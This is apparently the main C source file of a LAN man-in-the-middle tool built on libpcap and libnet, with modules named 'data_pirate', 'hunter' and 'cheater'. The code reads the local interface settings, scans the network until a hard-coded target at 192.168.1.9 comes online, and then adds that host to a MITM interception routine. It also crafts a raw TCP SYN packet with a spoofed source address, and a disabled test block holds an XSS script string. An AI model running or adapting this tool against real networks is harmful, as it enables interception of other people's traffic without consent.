#include <stdio.h>

#include <pcap.h>
#include <libnet.h>

#include "data_pirate.h"
#include "sender.h"
#include "router.h"
#include "net_state.h"
#include "gzip_wrapper.h"

#define INTERFACE   "en0"


unsigned char*
get_my_ip_address(unsigned char* card_name)
{
    unsigned char   *f  = "ifconfig %s | grep -e \"inet\\b\" | awk '{print $2}'";
    static unsigned char    ret[1024]   = {0};
    sprintf(ret, f, card_name);
    FILE*   fp  = popen(ret, "r");
    fgets(ret, 1024, fp);
    pclose(fp);
    return ret;
}

unsigned char*
get_my_eth_address(unsigned char* card_name)
{
    unsigned char   *f  = "ifconfig %s | grep -e \"ether\\b\" | awk '{print $2}'";
    unsigned char   buf[1024]   = {0};
    static unsigned char   mac[8]      = {0};
    sprintf(buf, f, card_name);
    FILE*   fp  = popen(buf, "r");
    fgets(buf, 1024, fp);
    pclose(fp);

    sscanf(buf, "%2x:%2x:%2x:%2x:%2x:%2x", 
        mac, mac + 1, mac + 2, mac + 3, mac + 4, mac + 5);

    return mac;
}


unsigned int
get_my_net_mask(unsigned char* card_name)
{
    unsigned int    netmask = 0;
    unsigned char   *f  = "ifconfig %s | grep -e \"netmask\" | awk '{print $4}'";
    unsigned char   buf[1024]   = {0};
    sprintf(buf, f, card_name);
    FILE*   fp  = popen(buf, "r");
    fgets(buf, 1024, fp);
    pclose(fp);
    sscanf(buf, "0x%08x", &netmask);

    return netmask;
}



int
finish(void)
{
    hunter_stop();
    sender_finish();
    return true;
}


void
signal_handler(int signo)
{
    finish();
    cheater_stop();
    printf("[!] exit by signal_handler\n\033[0m");
    exit(0);
}


int
initialize(const int argc, const char* argv[])
{
    char*   perr    = 0;

    _SET_LOG_OUT_FUN(printf);
    _SET_SEND_PACKAGE_FUN(sender_send);

    if(false == net_state_init( INTERFACE,
                                get_my_eth_address(INTERFACE),
                                _iptonetint32(get_my_ip_address(INTERFACE)),
                                _ntoh32(get_my_net_mask(INTERFACE)),
                                _iptonetint32("192.168.1.1")) )
    {
        return false;
    }

#if 1
    printf("card_name:\t%s\n", my_net_interface());
    printf("ip:\t\t%s\n", _netint32toip( my_ip_netint32()));
    printf("mask:\t\t%s\n", _netint32toip(net_mask_netint32()));
    printf("route:\t\t%s\n", _netint32toip(route_ip_netint32()));
    printf("max devices:\t%u\n", device_max());
#endif

    signal(SIGINT, signal_handler);     // ctrl+c handler

    if(false == sender_initialize(INTERFACE, &perr))
    {
        printf("%s\n", perr);
        return false;
    }
    
    if(false == hunter_start(INTERFACE, &perr))
    {
        printf("[!] hunter_initialize failed! caused by : %s\n",         \
                        perr);
        return -1;
    }

    return true;
}


void
send_pkt(void)
{
    static unsigned short    i =0;
    unsigned char   pkt[1400]   = {0};
    unsigned int    psize       = sizeof(pkt)/sizeof(*pkt);
    struct _ethhdr  *eth        = pkt;
    struct _iphdr   *ip         = pkt + sizeof(struct _ethhdr);
    struct _tcphdr  *tcp        = 0;
    unsigned char   *http       = 0;

    memcpy(eth->h_dest, "\x22\x22\x22\x22\x22\x22", 6);
    memcpy(eth->h_source, my_mac_address(), 6);
    eth->h_proto    = _ntoh16(_ETH_P_IP);

    ip->ihl         = 20/4;
    ip->version     = 4;
    ip->tos         = 0;
    ip->tot_len     = _ntoh16(psize - sizeof(struct _ethhdr));
    ip->id          = _ntoh16(i++);
    ip->frag_off    = 0;
    ip->ttl         = 64;
    ip->protocol    = _IPPROTO_TCP;
    ip->check       = 0;
    ip->saddr       = _iptonetint32("110.110.110.110");
    ip->daddr       = _iptonetint32("192.168.1.9");

    tcp     = (unsigned char*)ip + ip->ihl * 4;

    tcp->source     = _ntoh16(123);
    tcp->dest       = _ntoh16(80);
    tcp->seq        = 0;
    tcp->ack_seq    = 0;
    tcp->res1       = 0;
    tcp->doff       = 20/4;

    tcp->fin        = 0;
    tcp->syn        = 1;
    tcp->rst        = 0;
    tcp->psh        = 0;
    tcp->ack        = 0;
    tcp->urg        = 0;
    tcp->ece        = 0;
    tcp->cwr        = 0;

    tcp->window     = 64*1024;
    tcp->check      = 0;
    tcp->urg_ptr    = 0;

    http    = (unsigned char*)tcp + tcp->doff * 4;
    unsigned char   *str = "hands up and drop your weapon! you are under arrest!\r\n";
    memcpy(http, str, strlen(str));

    _SEND_PACKAGE(pkt, psize);
}



int
main(const int argc, const char* argv[])
{
    int         err     = 0;
    pthread_t   hunter  = 0;
    char*       perr    = 0;
    char        buf[1024]   = {0};

#if 0


    unsigned char   *test       = "<script>alert(\"fuck this\")</script>";
    unsigned char   dec[1000]   = {0};
    unsigned int    test_len    = strlen(test);
    unsigned int    retlen      = 1000;

    printf("test_len : %u \n", test_len);
    if(0 == gzcompress(test, test_len, dec, &retlen))
    {
        printf("test_len : %u\tretlen : %u\n", test_len, retlen);
    }

    test_len = 1000 - retlen;
    if(0 == gzdecompress(dec, retlen, dec + retlen, &test_len))
    {
        printf("%s\n", dec + retlen);
    }



    return 0;


#endif


    if(false == initialize(argc, argv))
    {
        return -1;
    }
    // while(1) sleep(1),send_pkt();exit(0);
    cheater_start();
#if 0
    int i=5;
    while(i--){ cheater_scan(); sleep(1);}
    unsigned char   target_ip[100]  = {0};

    printf("input the ip you want to mitm : \n");
    sleep(1);
    scanf("%s", target_ip);

    cheater_add_mitm(_iptonetint32(target_ip));
    getchar();
    getchar();
    cheater_delete(_iptonetint32(target_ip));


#else

#define TARGET_IP       "192.168.1.9"
// #define TARGET_IP2      "192.168.1.104"

    do{
        cheater_scan();
        sleep(1);
    }while(!is_device_online(_iptonetint32(TARGET_IP))
#ifdef TARGET_IP2
        || !is_device_online(_iptonetint32(TARGET_IP2))
#endif
        );

    cheater_add_mitm(_iptonetint32(TARGET_IP));

#ifdef TARGET_IP2
    cheater_add_mitm(_iptonetint32(TARGET_IP2));
#endif

    _DEBUG_LOG("target = %-15s, mac : ", TARGET_IP);
    unsigned char       *mac    = device_mac_address(_iptonetint32(TARGET_IP));
    _DEBUG_LOG("%02X:%02X:%02X:%02X:%02X:%02X\n",
                        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
#ifdef TARGET_IP2
    _DEBUG_LOG("target = %-15s, mac : ", TARGET_IP2);
    unsigned char       *mac2   = device_mac_address(_iptonetint32(TARGET_IP2));
    _DEBUG_LOG("%02X:%02X:%02X:%02X:%02X:%02X\n",
                        mac2[0], mac2[1], mac2[2], mac2[3], mac2[4], mac2[5]);
#endif

    getchar();

    cheater_delete(_iptonetint32(TARGET_IP));

#ifdef TARGET_IP2
    cheater_delete(_iptonetint32(TARGET_IP2));
#endif

    _DEBUG_LOG("cheater stop !\ntarget = %s\n", TARGET_IP);
#ifdef TARGET_IP2
    _DEBUG_LOG("cheater stop !\ntarget = %s\n", TARGET_IP2);
#endif

#endif
    sleep(8);

    // while(1) sleep(1);

    if(false == finish())
    {
        return -1;
    }

    return 0;
}












